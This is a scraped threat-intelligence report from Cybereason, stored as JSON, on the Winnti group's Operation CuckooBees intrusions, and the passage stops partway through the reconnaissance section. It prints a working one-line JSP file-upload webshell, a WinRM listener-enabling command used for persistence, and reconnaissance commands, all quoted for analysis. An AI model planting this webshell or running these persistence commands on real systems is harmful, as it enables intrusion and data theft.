@@ -1,0 +1,1381 @@
+{
+    "id": "<report_0x53fa2ad3>",
+    "url": "https://www.cybereason.com/blog/operation-cuckoobees-deep-dive-into-stealthy-winnti-techniques",
+    "title": "Operation CuckooBees: Deep-Dive into Stealthy Winnti Techniques",
+    "meta": [
+        {
+            "id": "<chapter_0x6809b641>",
+            "title": "Operation CuckooBees: Deep-Dive into Stealthy Winnti Techniques",
+            "title_level": 1,
+            "sentences": [
+                {
+                    "id": "<sentence_0x77fdc6e3>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "Written By",
+                    "html": "\nWritten By\n"
+                },
+                {
+                    "id": "<sentence_0x65955bc3>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "Cybereason Nocturnus",
+                    "html": "<p>Cybereason Nocturnus</p>"
+                },
+                {
+                    "id": "<sentence_0xfd82a3c0>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "May 4, 2022<crlf>|<crlf><crlf><crlf><crlf><crlf><crlf>11 minute read",
+                    "html": "<p class=\"date-and-duration\">\nMay 4, 2022\n |\n \n \n \n \n \n 11 minute read\n \n \n</p>"
+                },
+                {
+                    "id": "<sentence_0xf031b1c7>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<a_0xcb759a1b>": "https://www.cybereason.com/services/incident-response"
+                    },
+                    "text": "In 2021, the Cybereason Nocturnus Incident Response Team investigated multiple intrusions targeting technology and manufacturing companies located in Asia, Europe and North America. Based on the findings of our investigation, it appears that the goal behind these intrusions was to steal sensitive intellectual property for cyber espionage purposes.",
+                    "html": "<p>In 2021, the <a href=\"/services/incident-response\" rel=\"noopener\" target=\"_blank\">Cybereason Nocturnus Incident Response Team</a> investigated multiple intrusions targeting technology and manufacturing companies located in Asia, Europe and North America. Based on the findings of our investigation, it appears that the goal behind these intrusions was to steal sensitive intellectual property for cyber espionage purposes. </p>"
+                },
+                {
+                    "id": "<sentence_0xa8a6aaf6>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<a_0x67ab48b9>": "https://attack.mitre.org/groups/G0044/",
+                        "<a_0xad38f7bf>": "https://www.justice.gov/opa/pr/seven-international-cyber-defendants-including-apt41-actors-charged-connection-computer"
+                    },
+                    "text": "Cybereason assesses with moderate-high confidence that the threat actor behind the intrusion is the Winnti Group (also tracked as APT41, Blackfly and BARIUM), one of the most advanced and elusive APT groups that is known to operate on behalf of Chinese state interests and whose members have been indicted by the US Department of Justice for severe computer crimes.",
+                    "html": "<p>Cybereason assesses with moderate-high confidence that the threat actor behind the intrusion is the <a href=\"https://attack.mitre.org/groups/G0044/\" rel=\"noopener\" target=\"_blank\">Winnti Group</a> (also tracked as APT41, Blackfly and BARIUM), one of the most advanced and elusive APT groups that is known to operate on behalf of Chinese state interests and whose members have been indicted by the <a href=\"https://www.justice.gov/opa/pr/seven-international-cyber-defendants-including-apt41-actors-charged-connection-computer\">US Department of Justice</a> for severe computer crimes. </p>"
+                },
+                {
+                    "id": "<sentence_0xaf9926af>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<a_0xc9fa346>": "https://www.cybereason.com/blog/operation-cuckoobees-a-winnti-malware-arsenal-deep-dive"
+                    },
+                    "text": "Part 1 of this research offers a unique glimpse into the Winnti intrusion playbook, covering the techniques that were used by the group from initial compromise to data exfiltration, as observed and analyzed by the Cybereason IR Team. Part two of this research will offer a deep dive analysis of the groups tools and unique malware, including undocumented newly discovered Winnti malware.",
+                    "html": "<p>Part 1 of this research offers a unique glimpse into the Winnti intrusion playbook, covering the techniques that were used by the group from initial compromise to data exfiltration, as observed and analyzed by the Cybereason IR Team. <a href=\"/blog/operation-cuckoobees-a-winnti-malware-arsenal-deep-dive\" rel=\"noopener\" target=\"_blank\">Part two of this research</a> will offer a deep dive analysis of the group\u2019s tools and unique malware, including undocumented newly discovered Winnti malware.</p>"
+                }
+            ]
+        }
+    ],
+    "chapters": [
+        {
+            "id": "<chapter_0x2b647670>",
+            "title": "Operation CuckooBees: Deep-Dive into Stealthy Winnti Techniques",
+            "title_level": 1,
+            "sentences": [
+                {
+                    "id": "<sentence_0x37bdfeb6>",
+                    "is_empty": true,
+                    "have_tags": true,
+                    "tags": {
+                        "<img_0xc35827f5>": "https://www.cybereason.com/hubfs/blog-post-text%20%2887%29.png"
+                    },
+                    "text": "",
+                    "html": "<img alt=\"\" src=\"https://www.cybereason.com/hubfs/blog-post-text%20%2887%29.png\"/>"
+                }
+            ]
+        },
+        {
+            "id": "<chapter_0x667cacfb>",
+            "title": "Key Findings",
+            "title_level": 2,
+            "sentences": [
+                {
+                    "id": "<sentence_0xc1309fc5>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<a_0xc9fa346>": "https://www.cybereason.com/blog/operation-cuckoobees-a-winnti-malware-arsenal-deep-dive"
+                    },
+                    "text": "Multi-year Cyber Espionage Intrusions: The Cybereason IR team investigated a sophisticated and elusive cyber espionage operation that has remained undetected since at least 2019 with the goal of stealing sensitive proprietary information from technology and manufacturing companies, mainly in East Asia, Western Europe, and North America.<crlf>Newly Discovered Malware and Multi-Stage Infection Chain: Part two of the research examines both known and previously undocumented Winnti malware which included digitally signed kernel-level rootkits as well as an elaborate multi-stage infection chain which enabled the operation to remain undetected since at least 2019.",
+                    "html": "<ul>\n<li>Multi-year Cyber Espionage Intrusions: The Cybereason IR team investigated a sophisticated and elusive cyber espionage operation that has remained undetected since at least 2019 with the goal of stealing sensitive proprietary information from technology and manufacturing companies, mainly in East Asia, Western Europe, and North America. </li>\n<li>Newly Discovered Malware and Multi-Stage Infection Chain: <a href=\"/blog/operation-cuckoobees-a-winnti-malware-arsenal-deep-dive\" rel=\"noopener\" target=\"_blank\">Part two of the research</a> examines both known and previously undocumented Winnti malware which included digitally signed kernel-level rootkits as well as an elaborate multi-stage infection chain which enabled the operation to remain undetected since at least 2019.</li>\n</ul>"
+                },
+                {
+                    "id": "<sentence_0x5372dab1>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "Winnti APT Group: Cybereason assesses with moderate-to-high confidence that the threat actor behind the set of intrusions is the Winnti Group, a Chinese state-sponsored APT group known for its stealth, sophistication and a focus on stealing technology.",
+                    "html": "<ul>\n<li>Winnti APT Group: Cybereason assesses with moderate-to-high confidence that the threat actor behind the set of intrusions is the Winnti Group, a Chinese state-sponsored APT group known for its stealth, sophistication and a focus on stealing technology. </li>\n</ul>"
+                },
+                {
+                    "id": "<sentence_0xd8f87623>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "The Winnti Playbook: This research offers a unique glimpse into the Winnti intrusion playbook, detailing the most frequently used tactics, as well as some lesser known evasive techniques that were observed during the investigation.",
+                    "html": "<ul>\n<li>The Winnti Playbook: This research offers a unique glimpse into the Winnti intrusion playbook, detailing the most frequently used tactics, as well as some lesser known evasive techniques that were observed during the investigation. </li>\n</ul>"
+                }
+            ]
+        },
+        {
+            "id": "<chapter_0xf2a2d07c>",
+            "title": "The Winnti Attack Lifecycle",
+            "title_level": 2,
+            "sentences": [
+                {
+                    "id": "<sentence_0x32269cf6>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<a_0x67ab48b9>": "https://attack.mitre.org/groups/G0044/"
+                    },
+                    "text": "During 2021, Cybereason Nocturnus investigated an elaborate espionage operation targeting a number of prominent organizations in Asia, Europe and North America. Cybereason attributes with moderate-to-high confidence that this operation was carried out by the Winnti APT group (also known as APT41, BARIUM, and Blackfly) - a Chinese state-sponsored APT that has been active since at least 2010.",
+                    "html": "<p>During 2021, Cybereason Nocturnus investigated an elaborate espionage operation targeting a number of prominent organizations in Asia, Europe and North America. Cybereason attributes with moderate-to-high confidence that this operation was carried out by the <a href=\"https://attack.mitre.org/groups/G0044/\" rel=\"noopener\" target=\"_blank\">Winnti APT group</a> (also known as APT41, BARIUM, and Blackfly) - a Chinese state-sponsored APT that has been active since at least 2010. </p>"
+                },
+                {
+                    "id": "<sentence_0xd85bf813>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "For years, this operation has remained under the radar, concealing a multi-layered attack scheme, with a wide and quite comprehensive toolbox. The following flow chart summarizes this groups attack life cycle in this operation:",
+                    "html": "<p>For years, this operation has remained under the radar, concealing a multi-layered attack scheme, with a wide and quite comprehensive toolbox. The following flow chart summarizes this group\u2019s attack life cycle in this operation:</p>"
+                },
+                {
+                    "id": "<sentence_0x78f08498>",
+                    "is_empty": true,
+                    "have_tags": true,
+                    "tags": {
+                        "<img_0x6af24bed>": "https://3354902.fs1.hubspotusercontent-na1.net/hub/3354902/hubfs/Capture-May-02-2022-08-50-17-72-PM.png?width=748&name=Capture-May-02-2022-08-50-17-72-PM.png"
+                    },
+                    "text": "",
+                    "html": "<p><img alt=\"Capture-May-02-2022-08-50-17-72-PM\" src=\"https://3354902.fs1.hubspotusercontent-na1.net/hub/3354902/hubfs/Capture-May-02-2022-08-50-17-72-PM.png?width=748&amp;name=Capture-May-02-2022-08-50-17-72-PM.png\" width=\"748\"/></p>"
+                },
+                {
+                    "id": "<sentence_0x67f0b560>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<a_0x5d4e8bb8>": "https://en.wikipedia.org/wiki/Enterprise_resource_planning"
+                    },
+                    "text": "The attackers initial foothold in the organization originated from multiple vulnerabilities in the organizational ERP (Enterprise Resource Planning) platform. From there, the attackers installed persistence in the form of a WebShell and began conducting reconnaissance and credential dumping, enabling them to move laterally in the network. Ultimately, it allowed the attackers to steal highly sensitive information from critical servers and endpoints belonging to high-profile stakeholders.",
+                    "html": "<p>The attackers\u2019 initial foothold in the organization originated from multiple vulnerabilities in the organizational <a href=\"https://en.wikipedia.org/wiki/Enterprise_resource_planning\" rel=\"noopener\" target=\"_blank\">ERP</a> (Enterprise Resource Planning) platform. From there, the attackers installed persistence in the form of a WebShell and began conducting reconnaissance and credential dumping, enabling them to move laterally in the network. Ultimately, it allowed the attackers to steal highly sensitive information from critical servers and endpoints belonging to high-profile stakeholders. </p>"
+                },
+                {
+                    "id": "<sentence_0xd4570901>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "Analysis of the data available to Cybereason suggests that the goal of the operation was focused on cyber espionage with the aim of stealing proprietary information, R&D documents, source code and blueprints for various technologies.",
+                    "html": "<p>Analysis of the data available to Cybereason suggests that the goal of the operation was focused on cyber espionage with the aim of stealing proprietary information, R&amp;D documents, source code and blueprints for various technologies. </p>"
+                },
+                {
+                    "id": "<sentence_0xfd1d5462>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "The attackers managed to go undetected for years by using stealthy techniques combined with state-of-the-art attack and espionage tools which included advanced rootkits.",
+                    "html": "<p>The attackers managed to go undetected for years by using stealthy techniques combined with state-of-the-art attack and espionage tools which included advanced rootkits. </p>"
+                }
+            ]
+        },
+        {
+            "id": "<chapter_0xb8d14a32>",
+            "title": "Initial Compromise",
+            "title_level": 3,
+            "sentences": [
+                {
+                    "id": "<sentence_0x6bcb7d56>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "According to the Cybereason IR investigation, the infection vector that was used to compromise Winnti targets consisted of the exploitation of a popular ERP solution leveraging multiple vulnerabilities, some known and some that were unknown at the time of the exploitation.",
+                    "html": "<p>According to the Cybereason IR investigation, the infection vector that was used to compromise Winnti targets consisted of the exploitation of a popular ERP solution leveraging multiple vulnerabilities, some known and some that were unknown at the time of the exploitation. </p>"
+                },
+                {
+                    "id": "<sentence_0x40a7d69a>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<a_0x19ba3579>": "https://redmimicry.com/posts/redmimicry-winnti/"
+                    },
+                    "text": "One of the first actions that were taken after a successful exploit was an attempt to find a specific DLL file under the VMware Tools folder, gthread-3.6.dll. The DLL file is invoked by the intermediate dropper, and the role of the DLL is to inject the payload into svchost.exe on the targeted system. This TTP has been observed before, and is known to be characteristic of the Winnti group:",
+                    "html": "<p>One of the first actions that were taken after a successful exploit was an attempt to find a specific DLL file under the VMware Tools folder, gthread-3.6.dll. The DLL file is invoked by the intermediate dropper, and the role of the DLL is to inject the payload into svchost.exe on the targeted system. This TTP has been observed before, and is <a href=\"https://redmimicry.com/posts/redmimicry-winnti/\" rel=\"noopener\" target=\"_blank\">known to be characteristic</a> of the Winnti group:</p>"
+                },
+                {
+                    "id": "<sentence_0x88fbcc66>",
+                    "is_empty": true,
+                    "have_tags": true,
+                    "tags": {
+                        "<table_0x711ad155>": {
+                            "0": {
+                                "0": "dir \"C:\\Program Files\\VMware\\VMware Tools\\gthread-3.6.dll\""
+                            }
+                        }
+                    },
+                    "text": "",
+                    "html": "<table>\n<tbody>\n<tr>\n<td>\n<p>dir \"C:\\Program Files\\VMware\\VMware Tools\\gthread-3.6.dll\"</p>\n</td>\n</tr>\n</tbody>\n</table>"
+                },
+                {
+                    "id": "<sentence_0x20f63f92>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "Command line to search for the DLL file",
+                    "html": "<p>Command line to search for the DLL file</p>"
+                },
+                {
+                    "id": "<sentence_0x57b72d51>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "Searching for this DLL could suggest that the attackers had already compromised that environment in the past, or that they were attempting to avoid infecting endpoints already compromised by them.",
+                    "html": "<p>Searching for this DLL could suggest that the attackers had already compromised that environment in the past, or that they were attempting to avoid infecting endpoints already compromised by them.</p>"
+                }
+            ]
+        },
+        {
+            "id": "<chapter_0x72e3dfa6>",
+            "title": "Persistence",
+            "title_level": 3,
+            "sentences": [
+                {
+                    "id": "<sentence_0xcba764da>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "The Cybereason Nocturnus IR team observed multiple persistence techniques that were used by Winnti over the course of the intrusion. While some techniques are quite trivial and well-known, some persistence techniques are rare and advanced which only a handful of threat actors are known to have used before.",
+                    "html": "<p>The Cybereason Nocturnus IR team observed multiple persistence techniques that were used by Winnti over the course of the intrusion. While some techniques are quite trivial and well-known, some persistence techniques are rare and advanced which only a handful of threat actors are known to have used before.</p>"
+                }
+            ]
+        },
+        {
+            "id": "<chapter_0xaed424e8>",
+            "title": "Persistence Technique #1: WebShell",
+            "title_level": 4,
+            "sentences": [
+                {
+                    "id": "<sentence_0x77933ec>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<a_0x8b7a9f01>": "https://en.wikipedia.org/wiki/Jakarta_Server_Pages"
+                    },
+                    "text": "The first attempt to establish a foothold on patient zero was achieved by embedding a minimal JSP code for deploying a Webshell under the ERP Web Application server directory using an RCE exploit:",
+                    "html": "<p>The first attempt to establish a foothold on \u201cpatient zero\u201d was achieved by embedding a minimal <a href=\"https://en.wikipedia.org/wiki/Jakarta_Server_Pages\" rel=\"noopener\" target=\"_blank\">JSP</a> code for deploying a Webshell under the ERP Web Application server directory using an RCE exploit:</p>"
+                },
+                {
+                    "id": "<sentence_0x2cef9c98>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<a_0xefca2a5a>": "https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wscript"
+                    },
+                    "text": "The attackers dropped an encoded VBScript version of the Webshell to the %UserProfile% directory off the ERP Web Service account.<crlf>Once the attackers wrote the dropper to the disk, they executed the encoded VBScript file using wscript and wrote the decoded output to a text file.<crlf>The final step was copying the output text file to a folder that is accessible externally via the ERP Web Service and changing the extension to .jsp so it would act as a Webshell:",
+                    "html": "<ul>\n<li>The attackers dropped an encoded VBScript version of the Webshell to the %UserProfile% directory off the ERP Web Service account.</li>\n<li>Once the attackers wrote the dropper to the disk, they executed the encoded VBScript file using <a href=\"https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wscript\" rel=\"noopener\" target=\"_blank\">wscript</a> and wrote the decoded output to a text file.</li>\n<li>The final step was copying the output text file to a folder that is accessible externally via the ERP Web Service and changing the extension to .jsp so it would act as a Webshell:</li>\n</ul>"
+                },
+                {
+                    "id": "<sentence_0xcf236a6e>",
+                    "is_empty": true,
+                    "have_tags": true,
+                    "tags": {
+                        "<table_0xf97fc268>": {
+                            "0": {
+                                "0": "<%  if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application.getRealPath(\"\\\\\")+request.getParameter(\"f\"))).write(request.getParameter(\"t\").getBytes());  %>"
+                            }
+                        }
+                    },
+                    "text": "",
+                    "html": "<table>\n<tbody>\n<tr>\n<td>\n<p>&lt;%</p>\n<p>if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application.getRealPath(\"\\\\\")+request.getParameter(\"f\"))).write(request.getParameter(\"t\").getBytes());</p>\n<p>%&gt;</p>\n</td>\n</tr>\n</tbody>\n</table>"
+                },
+                {
+                    "id": "<sentence_0x6b101743>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "A sample file uploader dropped by the Threat Actor",
+                    "html": "<p>A sample file uploader dropped by the Threat Actor</p>"
+                },
+                {
+                    "id": "<sentence_0x35d4c459>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<a_0x57641f8b>": "https://www.google.com/search?q=%3C%25+if%28request.getParameter%28%22f%22%29%21%3Dnull%29%28new+java.io.FileOutputStream%28application.getRealPath%28%22%5C%5C%22%29%2Brequest.getParameter%28%22f%22%29%29%29.write%28request.getParameter%28%22t%22%29.getBytes%28%29%29%3B+%25%3E&tbas=0&biw=1552&bih=1020&source=lnt&tbs=cdr%3A1%2Ccd_min%3A1%2F1%2F2000%2Ccd_max%3A1%2F1%2F2013&tbm=",
+                        "<a_0x13741f07>": "https://github.com/"
+                    },
+                    "text": "It is interesting to note that the above code has been known since at least August 2006, and has been published in several Chinese hacking websites, as well on GitHub repositories owned by Chinese-speaking users introducing this code as a one-liner for trojan or backdoor uploads:",
+                    "html": "<p>It is interesting to note that the above code has been known since at least August 2006, and has been published in several <a href=\"https://www.google.com/search?q=%3C%25+if%28request.getParameter%28%22f%22%29%21%3Dnull%29%28new+java.io.FileOutputStream%28application.getRealPath%28%22%5C%5C%22%29%2Brequest.getParameter%28%22f%22%29%29%29.write%28request.getParameter%28%22t%22%29.getBytes%28%29%29%3B+%25%3E&amp;tbas=0&amp;biw=1552&amp;bih=1020&amp;source=lnt&amp;tbs=cdr%3A1%2Ccd_min%3A1%2F1%2F2000%2Ccd_max%3A1%2F1%2F2013&amp;tbm=\" rel=\"noopener\" target=\"_blank\">Chinese hacking websites</a>, as well on <a href=\"https://github.com/\">GitHub</a> repositories owned by Chinese-speaking users introducing this code as a one-liner for trojan or backdoor uploads:</p>"
+                },
+                {
+                    "id": "<sentence_0x6aecf3e5>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<img_0x93f94ec2>": "https://www.cybereason.com/hs-fs/hubfs/image3-Apr-26-2022-06-57-39-38-PM.png?width=840&name=image3-Apr-26-2022-06-57-39-38-PM.png"
+                    },
+                    "text": "JSP code snippet search results on Google",
+                    "html": "<p><img alt=\"image3-Apr-26-2022-06-57-39-38-PM\" src=\"https://www.cybereason.com/hs-fs/hubfs/image3-Apr-26-2022-06-57-39-38-PM.png?width=840&amp;name=image3-Apr-26-2022-06-57-39-38-PM.png\" width=\"840\"/>JSP code snippet search results on Google </p>"
+                },
+                {
+                    "id": "<sentence_0x38dc4a5c>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<a_0xfa7ee2e>": "https://github.com/chickenlove/webshell/blob/master/jsp/hackk8/jsp_77/win32/up_win32.jsp",
+                        "<a_0x64409a7b>": "https://github.com/chickenlove/webshell/blob/master/jsp/css.jsp",
+                        "<a_0x46b843c5>": "https://github.com/chickenlove/webshell/blob/master/jsp/hackk8/jsp_77/win32/cmd_win32.jsp"
+                    },
+                    "text": "Multiple instances of such .jsp files were found on ERP servers. Based on the analysis of the source files found in our searches, we determined the aforementioned Webshell was almost identical to a publicly known Webshell called up_win32.jsp. Moreover, we found another Webshell named css.jsp, which has similarities to the code of another publicly known Webshell called cmd_win32.jsp:",
+                    "html": "<p>Multiple instances of such .jsp files were found on ERP servers. Based on the analysis of the source files found in our searches, we determined the aforementioned Webshell was almost identical to a publicly known Webshell called <a href=\"https://github.com/chickenlove/webshell/blob/master/jsp/hackk8/jsp_77/win32/up_win32.jsp\" rel=\"noopener\" target=\"_blank\">up_win32.jsp</a>. Moreover, we found another Webshell named <a href=\"https://github.com/chickenlove/webshell/blob/master/jsp/css.jsp\">css.jsp</a>, which has similarities to the code of another publicly known Webshell called <a href=\"https://github.com/chickenlove/webshell/blob/master/jsp/hackk8/jsp_77/win32/cmd_win32.jsp\" rel=\"noopener\" target=\"_blank\">cmd_win32.jsp</a>:</p>"
+                },
+                {
+                    "id": "<sentence_0x9e10954>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<img_0xc70ba35c>": "https://www.cybereason.com/hs-fs/hubfs/image2-Apr-26-2022-06-58-22-80-PM.png?width=1357&name=image2-Apr-26-2022-06-58-22-80-PM.png"
+                    },
+                    "text": "ERP exploitation process tree as seen in the Cybereason XDR Platform",
+                    "html": "<p><img alt=\"image2-Apr-26-2022-06-58-22-80-PM\" src=\"https://www.cybereason.com/hs-fs/hubfs/image2-Apr-26-2022-06-58-22-80-PM.png?width=1357&amp;name=image2-Apr-26-2022-06-58-22-80-PM.png\" width=\"1357\"/>ERP exploitation process tree as seen in the Cybereason XDR Platform</p>"
+                },
+                {
+                    "id": "<sentence_0x3e4390b5>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<a_0xb0c57150>": "https://www.welivesecurity.com/2021/03/10/exchange-servers-under-siege-10-apt-groups/"
+                    },
+                    "text": "After establishing a Webshell-based foothold, the attackers shifted their focus to internal reconnaissance and lateral movement efforts. This is not the first time Winnti has used Webshell as a foothold tactic; in March 2021, ESET published a report naming Winnti as one of the groups that targeted Exchange servers and deployed Webshell on the compromised systems.",
+                    "html": "<p>After establishing a Webshell-based foothold, the attackers shifted their focus to internal reconnaissance and lateral movement efforts. This is not the first time Winnti has used Webshell as a foothold tactic; in March 2021, ESET published a <a href=\"https://www.welivesecurity.com/2021/03/10/exchange-servers-under-siege-10-apt-groups/\" rel=\"noopener\" target=\"_blank\">report</a> naming Winnti as one of the groups that targeted Exchange servers and deployed Webshell on the compromised systems.</p>"
+                }
+            ]
+        },
+        {
+            "id": "<chapter_0xffb5548d>",
+            "title": "Persistence Technique #2: WinRM over HTTP/HTTPS",
+            "title_level": 4,
+            "sentences": [
+                {
+                    "id": "<sentence_0x197f822f>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "The Cybereason Nocturnus & IR Team investigation also revealed a second persistence mechanism that granted the attackers an additional backup entry point enabling the native Windows feature WinRM over HTTP/HTTPS on the compromised servers.",
+                    "html": "<p>The Cybereason Nocturnus &amp; IR Team investigation also revealed a second persistence mechanism that granted the attackers an additional backup entry point enabling the native Windows feature WinRM over HTTP/HTTPS on the compromised servers.</p>"
+                },
+                {
+                    "id": "<sentence_0x2edc6d2>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<a_0x599af498>": "https://attack.mitre.org/techniques/T1021/006/",
+                        "<a_0xc5f7c13c>": "https://docs.microsoft.com/en-us/windows/win32/winrm/scripting-in-windows-remote-management"
+                    },
+                    "text": "WinRM is a Microsoft Windows native remote management protocol that provides remote shell access. This protocol can be configured with a HTTP (Port 80) or HTTPS (Port 443) listener using the WinRM Scripting API called through a legitimate Visual Basic script file called Winrm.vbs.",
+                    "html": "<p><a href=\"https://attack.mitre.org/techniques/T1021/006/\">WinRM</a> is a Microsoft Windows native remote management protocol that provides remote shell access. This protocol can be configured with a HTTP (Port 80) or HTTPS (Port 443) listener using the WinRM Scripting API called through a legitimate Visual Basic script file called <a href=\"https://docs.microsoft.com/en-us/windows/win32/winrm/scripting-in-windows-remote-management\" rel=\"noopener\" target=\"_blank\">Winrm.vbs</a>. </p>"
+                },
+                {
+                    "id": "<sentence_0x3b13417c>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<a_0xd52d0940>": "https://lolbas-project.github.io/lolbas/Binaries/Cscript/"
+                    },
+                    "text": "The attackers executed cscript.exe to modify the systems WinRM configuration by setting the values of EnableCompatibilityHttpListener and EnableCompatibilityHttpsListener to True, and by doing so, they enabled HTTP and HTTPS listeners for remote shell access, preserving another way of persistence with c cscript command line to enable HTTP and HTTPS listeners:",
+                    "html": "<p>The attackers executed <a href=\"https://lolbas-project.github.io/lolbas/Binaries/Cscript/\" rel=\"noopener\" target=\"_blank\">cscript.exe</a> to modify the system\u2019s WinRM configuration by setting the values of EnableCompatibilityHttpListener and EnableCompatibilityHttpsListener to True, and by doing so, they enabled HTTP and HTTPS listeners for remote shell access, preserving another way of persistence with c cscript command line to enable HTTP and HTTPS listeners: </p>"
+                },
+                {
+                    "id": "<sentence_0xfc1cd8ea>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "cscript //nologo \"C:\\Windows\\System32\\winrm.vbs\" set winrm/config/service @{EnableCompatibilityHttpsListener=\"true\"}",
+                    "html": "<p>cscript //nologo \"C:\\Windows\\System32\\winrm.vbs\" set winrm/config/service @{EnableCompatibilityHttpsListener=\"true\"}</p>"
+                },
+                {
+                    "id": "<sentence_0x3ce769b2>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<img_0xdcf2f11>": "https://www.cybereason.com/hs-fs/hubfs/image5-Apr-26-2022-06-59-11-65-PM.png?width=805&name=image5-Apr-26-2022-06-59-11-65-PM.png"
+                    },
+                    "text": "Modifying system WinRM configuration using cscript.exe as seen in the Cybereason XDR Platform",
+                    "html": "<p><img alt=\"image5-Apr-26-2022-06-59-11-65-PM\" src=\"https://www.cybereason.com/hs-fs/hubfs/image5-Apr-26-2022-06-59-11-65-PM.png?width=805&amp;name=image5-Apr-26-2022-06-59-11-65-PM.png\" width=\"805\"/>Modifying system WinRM configuration using cscript.exe as seen in the Cybereason XDR Platform</p>"
+                }
+            ]
+        },
+        {
+            "id": "<chapter_0x769253ef>",
+            "title": "Persistence Technique #3: Loading a Signed Kernel Rootkit",
+            "title_level": 4,
+            "sentences": [
+                {
+                    "id": "<sentence_0x939b942>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<a_0x742fdb41>": "https://attack.mitre.org/techniques/T1547/006/"
+                    },
+                    "text": "The attackers leveraged a Signed Kernel Rootkit to establish an additional persistence mechanism. Detailed analysis of this stealthy rootkit will be provided in part two of this research in the series, which offers a deep dive into the Winnti malware arsenal.",
+                    "html": "<p>The attackers leveraged a <a href=\"https://attack.mitre.org/techniques/T1547/006/\">Signed Kernel Rootkit</a> to establish an additional persistence mechanism. Detailed analysis of this stealthy rootkit will be provided in part two of this research in the series, which offers a deep dive into the Winnti malware arsenal.</p>"
+                }
+            ]
+        },
+        {
+            "id": "<chapter_0xdd43ba69>",
+            "title": "Persistence Technique #4: Windows Service",
+            "title_level": 4,
+            "sentences": [
+                {
+                    "id": "<sentence_0x2389338c>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<a_0x9ca07eed>": "https://attack.mitre.org/techniques/T1543/003/",
+                        "<a_0xb737355>": "https://attack.mitre.org/techniques/T1574/002/"
+                    },
+                    "text": "The attackers abused the legitimate IKEEXT and PrintNotify Windows Services to side-load Winnti DLLs and preserve persistence. Full analysis will also be provided in part two of the research.",
+                    "html": "<p>The attackers abused the legitimate IKEEXT and PrintNotify <a href=\"https://attack.mitre.org/techniques/T1543/003/\">Windows Services</a> to <a href=\"https://attack.mitre.org/techniques/T1574/002/\">side-load</a> Winnti DLLs and preserve persistence. Full analysis will also be provided in part two of the research.</p>"
+                }
+            ]
+        },
+        {
+            "id": "<chapter_0x276aabcf>",
+            "title": "Reconnaissance",
+            "title_level": 3,
+            "sentences": []
+        },
+        {
+            "id": "<chapter_0xd4d4425c>",
+            "title": "Initial Reconnaissance",
+            "title_level": 4,
+            "sentences": [
+                {
+                    "id": "<sentence_0x65c424f>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "Upon gaining access to the Windows ERP server, Winnti used the following commands:",
+                    "html": "<p>Upon gaining access to the Windows ERP server, Winnti used the following commands:</p>"
+                },
+                {
+                    "id": "<sentence_0x893c9eae>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "cat /etc/hosts<crlf>route print",
+                    "html": "<ul>\n<li>cat /etc/hosts</li>\n<li>route print</li>\n</ul>"
+                },
+                {
+                    "id": "<sentence_0xc6f8ecc0>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "The nature of these commands suggest they may have been part of an automated vulnerability discovery process, as the ERP server is a Windows server and cat /etc/hosts is a Unix command.",
+                    "html": "<p>The nature of these commands suggest they may have been part of an automated vulnerability discovery process, as the ERP server is a Windows server and cat /etc/hosts is a Unix command.</p>"
+                },
+                {
+                    "id": "<sentence_0xec5606c5>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "After these commands were executed, the attackers began a more dedicated reconnaissance activity using built-in Windows commands to gather information on the compromised server, rounding out the initial reconnaissance phase:",
+                    "html": "<p>After these commands were executed, the attackers began a more dedicated reconnaissance activity using built-in Windows commands to gather information on the compromised server, rounding out the initial reconnaissance phase:</p>"
+                },
